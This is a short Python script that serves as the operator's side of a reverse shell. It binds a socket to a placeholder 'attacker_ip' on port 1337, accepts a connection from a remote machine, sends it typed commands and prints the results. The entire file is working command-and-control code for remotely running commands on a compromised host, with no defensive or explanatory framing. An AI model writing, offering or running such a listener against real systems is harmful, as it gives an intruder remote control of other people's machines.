import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

while True:
	cmd = input("enter a command: ")
	
	## if you want to quit and close the connection
	if cmd == "quit":
		connection.send(b"quit") # send quit message in bytes
		connection.close()	# close the connection
		break				# break the loop to stop
		
	connection.send(bytes(cmd, "utf-8")) 
	
	output = connection.recv(2048)
	print(output.decode("utf-8"))

print("Server has stopped")
